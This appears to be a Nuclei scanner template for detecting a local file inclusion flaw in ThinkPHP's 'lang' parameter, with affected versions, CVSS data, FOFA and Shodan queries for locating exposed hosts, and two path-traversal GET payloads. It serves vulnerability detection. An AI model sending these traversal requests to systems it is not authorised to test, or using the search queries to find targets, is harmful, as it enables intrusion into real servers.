id: thinkphp6-lang-lfi
info:
  author: kagamigawa
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: 'Thinkphp Lang 6.0.1~v6.0.13, v5.0.x~v5.1.41, v5.0.0~v5.0.24 is vulnerable
    to local file inclusion.

    '
  metadata:
    fofa-query: header="think_lang"
    shodan-query: title:"Thinkphp"
    verified: true
  name: Thinkphp Lang - Local File Inclusion
  reference:
  - https://tttang.com/archive/1865/
  severity: high
  tags: thinkphp,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Call Stack
    - class="trace
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?lang=../../thinkphp/base'
  - '{{BaseURL}}/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug'
  stop-at-first-match: true
